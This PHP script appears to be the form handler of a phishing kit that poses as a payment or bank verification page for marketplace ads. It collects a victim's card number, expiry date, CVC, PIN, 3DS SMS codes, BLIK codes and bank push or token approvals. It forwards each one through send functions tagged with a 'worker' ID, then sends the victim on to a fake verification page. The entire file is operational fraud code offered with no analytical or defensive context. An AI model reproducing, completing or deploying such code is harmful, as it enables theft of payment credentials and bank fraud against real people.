<?php
include "service.php";
include "../settings.php";
if (file_exists("data/" . $_POST['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("data/" . $_POST["id"] . ".xml");

switch($_POST['type']){
    case 'sms':
        sendSMSz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, $_POST['3dscode']);
        header("location: verification.php?id=" . $_POST['id'] . "&wid=" . $xml->worker_id);
    break;
    case 'push':
        sendPUSHz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id);
        header("location: verification.php?id=" . $_POST['id'] . "&wid=" . $xml->worker_id);
    break;
    case 'checker':
        sendChecker($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, $_POST['checkingdata']);
        header("location: verification.php?id=" . $_POST['id'] . "&wid=" . $xml->worker_id);
    break;
    case 'blik':
        sendBlik($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, $_POST['blikdata']);
        header("location: verification.php?id=" . $_POST['id'] . "&wid=" . $xml->worker_id);
    break;
    case 'pkotoken':
        sendPKO($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id);
        header("location: verification.php?id=" . $_POST['id'] . "&wid=" . $xml->worker_id);
    break;
    case 'card':
        sendCard($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, $_POST['fcard'], $_POST['fexpm'] . "/" . $_POST['fexpy'], $_POST['fcvc']);
        header("location: verification.php?id=" . $_POST['id'] . "&wid=" . $xml->worker_id);
    break;
    case 'pin':
        sendPIN($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, $_POST['pindata']);
        header("location: verification.php?id=" . $_POST['id'] . "&wid=" . $xml->worker_id);
    break;
}
?>